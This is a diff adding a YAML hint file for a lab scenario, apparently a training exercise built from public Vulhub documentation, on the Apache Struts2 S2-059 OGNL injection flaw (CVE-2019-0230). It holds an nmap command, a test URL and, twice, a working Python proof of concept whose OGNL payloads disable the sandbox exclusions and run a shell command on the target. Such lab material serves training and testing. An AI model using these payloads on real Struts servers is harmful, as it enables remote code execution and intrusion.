@@ -1,0 +1,109 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: struts2/s2-059
+cve: CVE-2019-0230
+hint_levels:
+  low:
+  - Inspect the struts2 service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080/`.'
+  high:
+  - |-
+    Vulnerability: Struts2 S2-059 Remote Code Execution Vulnerablity(CVE-2019-0230).
+
+    CVE record(s): https://www.cve.org/CVERecord?id=CVE-2019-0230
+  - |-
+    Exploit
+
+    visit `http://{{NODE_IP}}:8080/?id=%25%7B233*233%7D`, it can be seen that the result of 233*233 has been returned in the id attribute.
+
+    1.png: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-059/1.png
+
+    OGNL Apache Struts exploit: Weaponizing a sandbox bypass (CVE-2018-11776): https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776 gives the details of OGNL sandbox bypass in Struts 2.5.16.
+
+    A simple Python POC for Verifying the vulnerability:
+
+    ```python
+    import requests
+
+    url = "http://{{NODE_IP}}:8080"
+    data1 = {
+        "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
+    }
+    data2 = {
+        "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/success'))}"
+    }
+    res1 = requests.post(url, data=data1)
+    # print(res1.text)
+    res2 = requests.post(url, data=data2)
+    # print(res2.text)
+    ```
+
+    Execute the poc and the `touch /tmp/success` command has been executed:
+
+    2.png: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-059/2.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-059/README.md'
+  - |-
+    Additional public references:
+    - https://cwiki.apache.org/confluence/display/WW/S2-059
+    - https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776
+access_instructions:
+  title: Struts2 S2-059 Remote Code Execution Vulnerablity(CVE-2019-0230)
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080/`.
+  - title: Exploit
+    instructions: |-
+      visit `http://{{NODE_IP}}:8080/?id=%25%7B233*233%7D`, it can be seen that the result of 233*233 has been returned in the id attribute.
+
+      1.png: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-059/1.png
+
+      OGNL Apache Struts exploit: Weaponizing a sandbox bypass (CVE-2018-11776): https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776 gives the details of OGNL sandbox bypass in Struts 2.5.16.
+
+      A simple Python POC for Verifying the vulnerability:
+
+      ```python
+      import requests
+
+      url = "http://{{NODE_IP}}:8080"
+      data1 = {
+          "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
+      }
+      data2 = {
+          "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/success'))}"
+      }
+      res1 = requests.post(url, data=data1)
+      # print(res1.text)
+      res2 = requests.post(url, data=data2)
+      # print(res2.text)
+      ```
+
+      Execute the poc and the `touch /tmp/success` command has been executed:
+
+      2.png: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-059/2.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-059/README.md
+  readme_sha256: b3a334a60b1803a34e51a237be9a875e1eeb4e67900d51b5d06786e1d43be748
+  compose_sha256: e71e6d932092e5b21cc6fe688437c1d15488711f584b307071b35c0b4421aeef
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
